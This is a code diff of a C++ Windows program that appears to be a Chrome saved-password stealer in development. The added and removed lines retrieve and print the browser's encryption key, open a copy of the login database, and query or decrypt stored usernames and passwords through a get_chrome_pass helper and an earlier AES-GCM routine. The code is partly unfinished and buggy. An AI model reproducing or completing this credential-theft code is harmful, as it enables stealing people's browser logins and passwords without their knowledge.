@@ -5,8 +5,9 @@
 #include <string>
 #include <vector>
 #include <iostream>
-#include "aes_gcm.h"
-//#include "aesDriver.cpp"
+//#include "aes_gcm.h"
+#include <sstream>
+#include "SQLfunctions.cpp"
 
 std::vector<BYTE> b64Decode(std::string strInput){
     // as before you should make two calls to ::CryptStringToBinaryA 
@@ -118,9 +119,8 @@ PDATA_BLOB GetEncryptionKey(){
     return Ret_Blob;
 }
 
-
+/* not used*/
 static int callback(void *data, int argc, char **argv, char **azColName){
-    (char *) data
    int i;
    for(i = 0; i<argc; i++){
       printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
@@ -128,31 +128,6 @@ static int callback(void *data, int argc, char **argv, char **azColName){
 
    printf("\n");
    return 0;
-}
-
-BYTE * getPassword(BYTE * key, BYTE * encrypted_password){
-    std::vector<BYTE>VEC_IV(encrypted_password + 3, encrypted_password + 15 );
-    std::vector<BYTE>cipher(encrypted_password + 15, encrypted_password + 15 + 23);
-    std::vector<BYTE> VEC_tag(encrypted_password + 15 + 23, encrypted_password); //check all indices
-    BYTE * textIV = VEC_IV.data() ;
-    BYTE * ciphertext = cipher.data();
-    BYTE * tag = VEC_tag.data();
-    auto box = new AESGCM(key);
-
-    //ctBufferSize = (DWORD)cipher.size();
-    box->Decrypt(textIV, sizeof(textIV), box->ciphertext, (DWORD)cipher.size(), box->tag, box->authTagLengths.dwMinLength );
-    for(size_t i=0; i< box->ptBufferSize; i++){
-        printf("%c", (char) box->plaintext[i]);
-    }
-    BYTE * ret = (BYTE *)malloc(cipher.size() + 1);
-    for(size_t i=0; i< box->ptBufferSize; i++){
-        ret[i] = box->plaintext[i];
-        printf("%c", (char) box->plaintext[i]);
-    }
-    printf("\n");
-    delete box;
-    printf("Goodbye!\n");
-    return ret;
 }
 
 
@@ -176,7 +151,13 @@ int main(){
     printf("COPY FILE W FAILED \n");
     printf("Error: %d\n", GetLastError());
    }
-
+    PDATA_BLOB key = (PDATA_BLOB)malloc(sizeof(DATA_BLOB));
+    key = GetEncryptionKey();
+    for (DWORD i = 0; i < key->cbData; i++){
+        printf("%x", key->pbData[i]);
+    }
+    printf("\n");
+    printf("\nWE HAVE THE KEY !\n");
    sqlite3 *db;
    char *zErrMsg = 0;
    const char *data = "QueryRes" ;
@@ -190,22 +171,10 @@ int main(){
    } else {
       fprintf(stderr, "Opened database successfully\n");
    }
-    const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
-   //const char * sql = "SELECT name, sql FROM sqlite_master";
-   //const char * sql = "SELECT * FROM logins";
-   //const char* data = "Callback function called";
-   rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
-
-   if( rc != SQLITE_OK ) {
-      fprintf(stderr, "SQL error: %s\n", zErrMsg);
-      sqlite3_free(zErrMsg);
-   } else {
-      fprintf(stdout, "Operation done successfully\n");
-   }
+   std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
    sqlite3_close(db);
-    PDATA_BLOB key = GetEncryptionKey();
-    printf("\nWE HAVE THE KEY !\n");
-    BYTE * encrypted_password; //get from sqlite
-    BYTE * password = getPassword(key->pbData , encrypted_password);
+    
+    //BYTE * encrypted_password; //get from sqlite
+    //BYTE * password = getPassword(key->pbData , encrypted_password);
        
 }
